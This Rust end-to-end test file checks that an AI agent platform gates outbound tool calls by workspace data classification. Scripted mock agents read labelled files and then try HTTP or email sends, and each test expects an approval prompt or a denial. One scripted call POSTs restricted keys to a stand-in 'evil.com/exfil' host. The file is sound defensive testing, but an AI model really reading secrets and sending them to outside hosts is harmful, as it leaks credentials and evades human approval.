//! E2E tests for data-classification enforcement across tools and connectors.
//!
//! Validates the full pipeline:
//! 1. Workspace files carry per-path classification labels
//! 2. `filesystem.read` resolves workspace classification and escalates the
//!    session's `effective_data_class` high-water mark
//! 3. Subsequent tool calls are allowed, prompted, or hard-blocked depending on
//!    `channel_class` vs `effective_data_class`
//! 4. Approval / denial interactions work end-to-end
//! 5. Session-level permission grants persist across tool calls

use hive_model::ModelRouter;
use hive_test_utils::{wait_for, ScriptedProvider, TestDaemon, DEFAULT_POLL_INTERVAL};
use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION};
use serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;

const TIMEOUT: Duration = Duration::from_secs(60);

// ── Shared helpers ───────────────────────────────────────────────────────

fn auth_headers() -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(AUTHORIZATION, HeaderValue::from_static("Bearer test-token"));
    headers
}

fn build_client() -> reqwest::Client {
    reqwest::Client::builder().default_headers(auth_headers()).build().expect("http client")
}

fn build_model_router(provider: ScriptedProvider) -> Arc<ModelRouter> {
    let mut router = ModelRouter::new();
    router.register_provider(provider);
    Arc::new(router)
}

/// Create a chat session and return `(session_id, workspace_path)`.
async fn create_session(client: &reqwest::Client, base: &str) -> (String, String) {
    let resp =
        client.post(format!("{base}/api/v1/chat/sessions")).send().await.expect("create session");
    assert!(resp.status().is_success(), "create session failed: {}", resp.status());
    let session: Value = resp.json().await.expect("session json");
    let session_id = session["id"].as_str().expect("session id").to_string();
    let workspace_path = session["workspace_path"].as_str().expect("workspace path").to_string();
    (session_id, workspace_path)
}

/// Set workspace classification (default + per-path overrides) via the API.
async fn set_classification(
    client: &reqwest::Client,
    base: &str,
    session_id: &str,
    default: &str,
    overrides: &[(&str, &str)],
) {
    // Set the default classification
    let resp = client
        .put(format!("{base}/api/v1/chat/sessions/{session_id}/workspace/classification"))
        .json(&json!({ "default": default }))
        .send()
        .await
        .expect("set classification default");
    assert!(resp.status().is_success(), "set default classification failed: {}", resp.status());

    // Set per-path overrides
    for (path, class) in overrides {
        let encoded_path = urlencoding::encode(path);
        let resp = client
            .put(format!(
                "{base}/api/v1/chat/sessions/{session_id}/workspace/classification/override?path={encoded_path}"
            ))
            .json(&json!({ "class": class }))
            .send()
            .await
            .expect("set classification override");
        assert!(resp.status().is_success(), "set override for {path} failed: {}", resp.status());
    }
}

/// Create test files in the session's workspace directory.
fn create_workspace_files(workspace_path: &str, files: &[(&str, &str)]) {
    for (rel_path, content) in files {
        let full_path = std::path::Path::new(workspace_path).join(rel_path);
        if let Some(parent) = full_path.parent() {
            std::fs::create_dir_all(parent).expect("create parent dirs");
        }
        std::fs::write(&full_path, content).expect("write workspace file");
    }
}

/// Send a chat message (fire-and-forget — the agent runs asynchronously).
async fn send_message(client: &reqwest::Client, base: &str, session_id: &str, content: &str) {
    let resp = client
        .post(format!("{base}/api/v1/chat/sessions/{session_id}/messages"))
        .json(&json!({ "content": content }))
        .send()
        .await
        .expect("send message");
    assert!(
        resp.status().is_success(),
        "send message failed: {} — {}",
        resp.status(),
        resp.text().await.unwrap_or_default()
    );
}

/// Wait for a pending approval matching the given `tool_id` for a session.
async fn wait_for_approval(
    client: &reqwest::Client,
    base: &str,
    session_id: &str,
    tool_id: &str,
) -> Value {
    wait_for(TIMEOUT, DEFAULT_POLL_INTERVAL, || {
        let client = client.clone();
        let url = format!("{base}/api/v1/pending-approvals");
        let sid = session_id.to_string();
        let tid = tool_id.to_string();
        async move {
            let resp = client.get(&url).send().await.ok()?;
            let approvals: Vec<Value> = resp.json().await.ok()?;
            approvals.into_iter().find(|a| {
                a["session_id"].as_str() == Some(&sid) && a["tool_id"].as_str() == Some(&tid)
            })
        }
    })
    .await
    .expect(&format!("timed out waiting for pending approval for tool '{tool_id}'"))
}

/// Respond to a pending tool approval.
async fn respond_to_approval(
    client: &reqwest::Client,
    base: &str,
    session_id: &str,
    request_id: &str,
    approved: bool,
    allow_session: bool,
) {
    let resp = client
        .post(format!("{base}/api/v1/chat/sessions/{session_id}/tool-approval"))
        .json(&json!({
            "request_id": request_id,
            "approved": approved,
            "allow_session": allow_session,
            "allow_agent": false
        }))
        .send()
        .await
        .expect("respond to approval");
    assert!(
        resp.status().is_success(),
        "respond to approval failed: {} — {}",
        resp.status(),
        resp.text().await.unwrap_or_default()
    );
}

/// Set session permissions via the API.
async fn set_permissions(client: &reqwest::Client, base: &str, session_id: &str, rules: Value) {
    let resp = client
        .put(format!("{base}/api/v1/chat/sessions/{session_id}/permissions"))
        .json(&json!({ "rules": rules }))
        .send()
        .await
        .expect("set permissions");
    assert!(
        resp.status().is_success(),
        "set permissions failed: {} — {}",
        resp.status(),
        resp.text().await.unwrap_or_default()
    );
}

/// Wait for the session to return to Idle state (agent finished processing).
async fn wait_for_idle(client: &reqwest::Client, base: &str, session_id: &str) {
    wait_for(TIMEOUT, DEFAULT_POLL_INTERVAL, || {
        let client = client.clone();
        let url = format!("{base}/api/v1/chat/sessions/{session_id}");
        async move {
            let resp = client.get(&url).send().await.ok()?;
            let session: Value = resp.json().await.ok()?;
            if session["state"].as_str() == Some("idle") {
                Some(())
            } else {
                None
            }
        }
    })
    .await
    .expect("timed out waiting for session to become idle");
}

/// Wait for a specific number of pending approvals to exist for a session.
async fn wait_for_no_approvals(client: &reqwest::Client, base: &str, session_id: &str) {
    wait_for(TIMEOUT, DEFAULT_POLL_INTERVAL, || {
        let client = client.clone();
        let url = format!("{base}/api/v1/pending-approvals");
        let sid = session_id.to_string();
        async move {
            let resp = client.get(&url).send().await.ok()?;
            let approvals: Vec<Value> = resp.json().await.ok()?;
            let session_approvals: Vec<_> =
                approvals.iter().filter(|a| a["session_id"].as_str() == Some(&sid)).collect();
            if session_approvals.is_empty() {
                Some(())
            } else {
                None
            }
        }
    })
    .await
    .expect("timed out waiting for approvals to clear");
}

// ── Scenario 1: Public data + Ask tool → approval from tool policy ───────

/// When workspace data is Public, a Public-channel Ask-approval tool
/// (`http.request`) triggers approval from the tool's own Ask policy
/// (not from classification), and proceeds when approved.
#[tokio::test(flavor = "multi_thread")]
async fn classification_public_data_ask_tool_needs_approval() {
    // The agent will: 1) read a public file, 2) call http.request, 3) return text.
    let provider = ScriptedProvider::new("mock", "test-model").default_responses(vec![
        // Turn 1: read a public file
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read1",
            "filesystem.read",
            json!({ "path": "readme.txt" }),
        ),
        // Turn 2: call http.request (Public channel, Ask approval)
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-http1",
            "http.request",
            json!({ "method": "GET", "url": "https://example.com/api" }),
        ),
        // Turn 3: return text after approval
        ScriptedProvider::text_response("mock", "test-model", "Public file read complete."),
    ]);

    let router = build_model_router(provider);
    let daemon = TestDaemon::builder().with_model_router(router).spawn().await.expect("daemon");
    let client = build_client();
    let base = &daemon.base_url;

    // Create session
    let (session_id, workspace_path) = create_session(&client, base).await;

    // Set workspace classification = Public
    set_classification(&client, base, &session_id, "public", &[]).await;

    // Create workspace file
    create_workspace_files(&workspace_path, &[("readme.txt", "This is a public README.")]);

    // Send message to trigger the agent
    send_message(&client, base, &session_id, "Read the readme and fetch the API").await;

    // Wait for pending approval (http.request has Ask approval by default)
    let approval = wait_for_approval(&client, base, &session_id, "http.request").await;
    let request_id = approval["request_id"].as_str().expect("request_id");

    // Approve the tool call
    respond_to_approval(&client, base, &session_id, request_id, true, false).await;

    // Wait for session to become idle
    wait_for_idle(&client, base, &session_id).await;

    // Verify no pending approvals remain
    wait_for_no_approvals(&client, base, &session_id).await;

    daemon.stop().await.expect("stop daemon");
}

// ── Scenario 2: Internal data + Public channel tool → classification approval

/// Reading an Internal-classified file escalates the session's data class.
/// A subsequent Public-channel tool triggers a classification-violation
/// approval prompt. When approved, the tool proceeds.
#[tokio::test(flavor = "multi_thread")]
async fn classification_internal_data_blocks_public_channel() {
    let provider = ScriptedProvider::new("mock", "test-model").default_responses(vec![
        // Turn 1: read an internal file → escalates DC to Internal
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read-internal",
            "filesystem.read",
            json!({ "path": "internal/design.txt" }),
        ),
        // Turn 2: call http.request (Public channel) → should trigger approval
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-http-internal",
            "http.request",
            json!({ "method": "GET", "url": "https://example.com/data" }),
        ),
        // Turn 3: return text after approval
        ScriptedProvider::text_response("mock", "test-model", "Internal data sent with approval."),
    ]);

    let router = build_model_router(provider);
    let daemon = TestDaemon::builder().with_model_router(router).spawn().await.expect("daemon");
    let client = build_client();
    let base = &daemon.base_url;

    let (session_id, workspace_path) = create_session(&client, base).await;

    // Default = Public, internal/ directory = Internal
    set_classification(&client, base, &session_id, "public", &[("internal", "internal")]).await;

    create_workspace_files(
        &workspace_path,
        &[
            ("readme.txt", "Public readme"),
            ("internal/design.txt", "Internal design document with sensitive details."),
        ],
    );

    send_message(&client, base, &session_id, "Read the internal design doc and fetch data").await;

    // Wait for approval — this is a classification violation (Internal > Public channel)
    let approval = wait_for_approval(&client, base, &session_id, "http.request").await;
    let request_id = approval["request_id"].as_str().expect("request_id");
    let reason = approval["reason"].as_str().unwrap_or("");
    // The reason should mention the classification/channel issue
    assert!(
        reason.contains("channel") || reason.contains("classified") || reason.contains("approval"),
        "expected classification-related reason, got: {reason}"
    );

    // Approve
    respond_to_approval(&client, base, &session_id, request_id, true, false).await;

    wait_for_idle(&client, base, &session_id).await;
    wait_for_no_approvals(&client, base, &session_id).await;

    daemon.stop().await.expect("stop daemon");
}

// ── Scenario 3: Internal data + Internal channel tool → auto-allowed ─────

/// When the session's effective data class is Internal and the tool's channel
/// class is also Internal (with Auto approval), the tool proceeds without
/// any approval prompt.
#[tokio::test(flavor = "multi_thread")]
async fn classification_internal_data_allows_internal_channel() {
    let provider = ScriptedProvider::new("mock", "test-model").default_responses(vec![
        // Turn 1: read a file (Internal default)
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read",
            "filesystem.read",
            json!({ "path": "docs/notes.txt" }),
        ),
        // Turn 2: list connectors (Internal channel, Auto approval) → should auto-allow
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-list-connectors",
            "connector.list",
            json!({}),
        ),
        // Turn 3: return text (no approval needed)
        ScriptedProvider::text_response("mock", "test-model", "Connectors listed successfully."),
    ]);

    let router = build_model_router(provider);
    let daemon = TestDaemon::builder().with_model_router(router).spawn().await.expect("daemon");
    let client = build_client();
    let base = &daemon.base_url;

    let (session_id, workspace_path) = create_session(&client, base).await;

    // Default classification = Internal
    set_classification(&client, base, &session_id, "internal", &[]).await;

    create_workspace_files(&workspace_path, &[("docs/notes.txt", "Internal notes.")]);

    send_message(&client, base, &session_id, "Read notes and list connectors").await;

    // The tool should auto-allow — wait for the session to go idle without approvals
    wait_for_idle(&client, base, &session_id).await;

    // Verify no approvals were needed
    let resp = client
        .get(format!("{base}/api/v1/pending-approvals"))
        .send()
        .await
        .expect("list approvals");
    let approvals: Vec<Value> = resp.json().await.expect("approvals json");
    let session_approvals: Vec<_> =
        approvals.iter().filter(|a| a["session_id"].as_str() == Some(&session_id)).collect();
    assert!(session_approvals.is_empty(), "expected no approvals for Internal→Internal");

    daemon.stop().await.expect("stop daemon");
}

// ── Scenario 4: Confidential data + Internal channel tool → approval ─────

/// Reading a Confidential-classified file escalates DC above Internal.
/// An Internal-channel Ask tool triggers an approval prompt.
#[tokio::test(flavor = "multi_thread")]
async fn classification_confidential_data_blocks_internal_channel() {
    let provider = ScriptedProvider::new("mock", "test-model").default_responses(vec![
        // Turn 1: read a confidential file → DC escalates to Confidential
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read-conf",
            "filesystem.read",
            json!({ "path": "confidential/report.txt" }),
        ),
        // Turn 2: send_external_message (Internal channel, Ask) → approval needed
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-send-conf",
            "comm.send_external_message",
            json!({
                "connector_id": "mock-email",
                "to": "recipient@example.com",
                "subject": "Report",
                "body": "Confidential data here"
            }),
        ),
        // Turn 3: return text after approval
        ScriptedProvider::text_response(
            "mock",
            "test-model",
            "Confidential report sent with approval.",
        ),
    ]);

    let router = build_model_router(provider);
    let daemon = TestDaemon::builder().with_model_router(router).spawn().await.expect("daemon");
    let client = build_client();
    let base = &daemon.base_url;

    let (session_id, workspace_path) = create_session(&client, base).await;

    set_classification(&client, base, &session_id, "public", &[("confidential", "confidential")])
        .await;

    create_workspace_files(
        &workspace_path,
        &[("confidential/report.txt", "Confidential financial report.")],
    );

    send_message(&client, base, &session_id, "Read the confidential report and send it").await;

    // Wait for approval — Confidential data exceeds Internal channel
    let approval =
        wait_for_approval(&client, base, &session_id, "comm.send_external_message").await;
    let request_id = approval["request_id"].as_str().expect("request_id");

    respond_to_approval(&client, base, &session_id, request_id, true, false).await;

    wait_for_idle(&client, base, &session_id).await;
    wait_for_no_approvals(&client, base, &session_id).await;

    daemon.stop().await.expect("stop daemon");
}

// ── Scenario 5: Restricted data + Auto tool → approval prompt ─────────────

/// When the session's DC is Restricted, an Auto-approved Public-channel tool
/// still triggers an approval prompt because the channel-class violation
/// requires explicit user consent. Auto-approval does not bypass classification.
///
/// We set a session permission rule that overrides http.request to Auto. With
/// Restricted DC, the middleware passes through to the approval dialog (Auto is
/// not Deny, so an ask path exists). Denying the approval blocks the tool.
#[tokio::test(flavor = "multi_thread")]
async fn classification_restricted_data_hard_blocks_auto_tool() {
    let provider = ScriptedProvider::new("mock", "test-model").default_responses(vec![
        // Turn 1: read a restricted file → DC = Restricted
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read-restricted",
            "filesystem.read",
            json!({ "path": "restricted/secrets.txt" }),
        ),
        // Turn 2: try http.request (which is now Auto via permissions)
        // Channel violation triggers an approval prompt despite Auto permission
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-http-blocked",
            "http.request",
            json!({ "method": "GET", "url": "https://example.com/upload" }),
        ),
        // Turn 3: agent handles the denial and returns text
        ScriptedProvider::text_response(
            "mock",
            "test-model",
            "The tool was blocked due to restricted data.",
        ),
    ]);

    let router = build_model_router(provider);
    let daemon = TestDaemon::builder().with_model_router(router).spawn().await.expect("daemon");
    let client = build_client();
    let base = &daemon.base_url;

    let (session_id, workspace_path) = create_session(&client, base).await;

    set_classification(&client, base, &session_id, "public", &[("restricted", "restricted")]).await;

    create_workspace_files(
        &workspace_path,
        &[("restricted/secrets.txt", "Top secret API keys and passwords.")],
    );

    // Override http.request to Auto approval — but this does NOT bypass
    // the channel-class violation, which still requires user consent.
    set_permissions(
        &client,
        base,
        &session_id,
        json!([
            { "tool_pattern": "http.request", "scope": "*", "decision": "auto" }
        ]),
    )
    .await;

    send_message(&client, base, &session_id, "Read the secrets and send them out").await;

    // Auto-permission does NOT bypass classification violations — an approval
    // prompt is created for the channel-class mismatch.
    let approval = wait_for_approval(&client, base, &session_id, "http.request").await;
    let request_id = approval["request_id"].as_str().expect("request_id");

    // Deny the tool call
    respond_to_approval(&client, base, &session_id, request_id, false, false).await;

    // Session should go idle after denial
    wait_for_idle(&client, base, &session_id).await;

    daemon.stop().await.expect("stop daemon");
}

// ── Scenario 6: Restricted data + Ask tool → approval prompt, deny ───────

/// With Restricted DC, a tool that keeps its Ask path (http.request without
/// permission override) still gets an approval prompt.  Denying the approval
/// blocks the tool.
#[tokio::test(flavor = "multi_thread")]
async fn classification_restricted_data_ask_tool_deny_works() {
    let provider = ScriptedProvider::new("mock", "test-model").default_responses(vec![
        // Turn 1: read restricted file → DC = Restricted
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read-r",
            "filesystem.read",
            json!({ "path": "restricted/keys.txt" }),
        ),
        // Turn 2: try http.request (still Ask) → approval prompt
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-http-r",
            "http.request",
            json!({ "method": "POST", "url": "https://evil.com/exfil" }),
        ),
        // Turn 3: after denial, agent gets error and returns text
        ScriptedProvider::text_response("mock", "test-model", "Tool was denied by the user."),
    ]);

    let router = build_model_router(provider);
    let daemon = TestDaemon::builder().with_model_router(router).spawn().await.expect("daemon");
    let client = build_client();
    let base = &daemon.base_url;

    let (session_id, workspace_path) = create_session(&client, base).await;

    set_classification(&client, base, &session_id, "public", &[("restricted", "restricted")]).await;

    create_workspace_files(&workspace_path, &[("restricted/keys.txt", "Private encryption keys.")]);

    send_message(&client, base, &session_id, "Read the keys and upload them").await;

    // Wait for approval prompt (Ask path exists)
    let approval = wait_for_approval(&client, base, &session_id, "http.request").await;
    let request_id = approval["request_id"].as_str().expect("request_id");

    // DENY the tool call
    respond_to_approval(&client, base, &session_id, request_id, false, false).await;

    // Session should go idle after denial
    wait_for_idle(&client, base, &session_id).await;

    daemon.stop().await.expect("stop daemon");
}

// ── Scenario 7: Escalation chain is monotonic ────────────────────────────

/// Reading files with increasing classification levels escalates the session's
/// effective_data_class monotonically (it never decreases).
#[tokio::test(flavor = "multi_thread")]
async fn classification_escalation_chain_is_monotonic() {
    let provider = ScriptedProvider::new("mock", "test-model").default_responses(vec![
        // Turn 1: read public file → DC stays Public (or escalates from default Internal to… well, workspace default is Public)
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read-pub",
            "filesystem.read",
            json!({ "path": "public/readme.txt" }),
        ),
        // Turn 2: read internal file → DC escalates to Internal
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read-int",
            "filesystem.read",
            json!({ "path": "internal/specs.txt" }),
        ),
        // Turn 3: read confidential file → DC escalates to Confidential
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read-conf",
            "filesystem.read",
            json!({ "path": "confidential/financials.txt" }),
        ),
        // Turn 4: try to call http.request (Public channel, Ask) → approval
        // The reason should reflect Confidential-level violation
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-http-esc",
            "http.request",
            json!({ "method": "GET", "url": "https://example.com/check" }),
        ),
        // Turn 5: after approval, return text
        ScriptedProvider::text_response("mock", "test-model", "Escalation chain complete."),
    ]);

    let router = build_model_router(provider);
    let daemon = TestDaemon::builder().with_model_router(router).spawn().await.expect("daemon");
    let client = build_client();
    let base = &daemon.base_url;

    let (session_id, workspace_path) = create_session(&client, base).await;

    set_classification(
        &client,
        base,
        &session_id,
        "public",
        &[("internal", "internal"), ("confidential", "confidential")],
    )
    .await;

    create_workspace_files(
        &workspace_path,
        &[
            ("public/readme.txt", "Public docs."),
            ("internal/specs.txt", "Internal specifications."),
            ("confidential/financials.txt", "Confidential financial data."),
        ],
    );

    send_message(&client, base, &session_id, "Read all files and check the API").await;

    // After reading Public, Internal, and Confidential files in sequence,
    // the DC should be at Confidential. The http.request call should trigger
    // an approval because Confidential > Public channel.
    let approval = wait_for_approval(&client, base, &session_id, "http.request").await;
    let request_id = approval["request_id"].as_str().expect("request_id");
    let reason = approval["reason"].as_str().unwrap_or("");

    // The reason should mention the data-classification level or channel violation
    assert!(
        reason.to_lowercase().contains("confidential")
            || reason.to_lowercase().contains("channel")
            || reason.to_lowercase().contains("classified"),
        "expected escalation-related reason, got: {reason}"
    );

    respond_to_approval(&client, base, &session_id, request_id, true, false).await;

    wait_for_idle(&client, base, &session_id).await;

    daemon.stop().await.expect("stop daemon");
}

// ── Scenario 9: Session permission grant persists ────────────────────────

/// After granting `allow_session` for a tool, subsequent calls to the same
/// tool are auto-approved without creating new pending approvals.
#[tokio::test(flavor = "multi_thread")]
async fn classification_session_permission_grant_persists() {
    // Two separate messages: the first triggers approval + grant,
    // the second should auto-approve.
    let provider = ScriptedProvider::new("mock", "test-model").default_responses(vec![
        // --- Message 1 ---
        // Turn 1: read internal file → DC = Internal
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-read-1",
            "filesystem.read",
            json!({ "path": "internal/doc.txt" }),
        ),
        // Turn 2: http.request → needs approval (Ask + channel violation)
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-http-1",
            "http.request",
            json!({ "method": "GET", "url": "https://example.com/first" }),
        ),
        // Turn 3: text after approval
        ScriptedProvider::text_response("mock", "test-model", "First call approved."),
        // --- Message 2 ---
        // Turn 4: http.request again → should be auto-approved due to session grant
        ScriptedProvider::tool_call_response(
            "mock",
            "test-model",
            "tc-http-2",
            "http.request",
            json!({ "method": "GET", "url": "https://example.com/second" }),
        ),
        // Turn 5: text (no approval needed)
        ScriptedProvider::text_response("mock", "test-model", "Second call auto-approved."),
    ]);

    let router = build_model_router(provider);
    let daemon = TestDaemon::builder().with_model_router(router).spawn().await.expect("daemon");
    let client = build_client();
    let base = &daemon.base_url;

    let (session_id, workspace_path) = create_session(&client, base).await;

    set_classification(&client, base, &session_id, "public", &[("internal", "internal")]).await;

    create_workspace_files(&workspace_path, &[("internal/doc.txt", "Internal document.")]);

    // --- Message 1: triggers approval ---
    send_message(&client, base, &session_id, "Read the doc and check the API").await;

    let approval = wait_for_approval(&client, base, &session_id, "http.request").await;
    let request_id = approval["request_id"].as_str().expect("request_id");

    // Approve with allow_session=true → creates a session permission rule
    respond_to_approval(&client, base, &session_id, request_id, true, true).await;

    wait_for_idle(&client, base, &session_id).await;

    // --- Message 2: should auto-approve ---
    send_message(&client, base, &session_id, "Now fetch the second endpoint").await;

    // Wait for idle — should complete without any approval prompt
    wait_for_idle(&client, base, &session_id).await;

    // Verify no pending approvals for this session
    let resp = client
        .get(format!("{base}/api/v1/pending-approvals"))
        .send()
        .await
        .expect("list approvals");
    let approvals: Vec<Value> = resp.json().await.expect("approvals json");
    let session_approvals: Vec<_> =
        approvals.iter().filter(|a| a["session_id"].as_str() == Some(&session_id)).collect();
    assert!(
        session_approvals.is_empty(),
        "expected no approvals after session-level grant, got {:?}",
        session_approvals
    );

    // Verify the session has the permission rule
    let resp = client
        .get(format!("{base}/api/v1/chat/sessions/{session_id}/permissions"))
        .send()
        .await
        .expect("get permissions");
    let perms: Value = resp.json().await.expect("perms json");
    let rules = perms["rules"].as_array().expect("rules array");
    let has_http_auto = rules.iter().any(|r| {
        r["tool_pattern"].as_str() == Some("http.request") && r["decision"].as_str() == Some("auto")
    });
    assert!(has_http_auto, "expected http.request auto permission rule, got: {rules:?}");

    daemon.stop().await.expect("stop daemon");
}
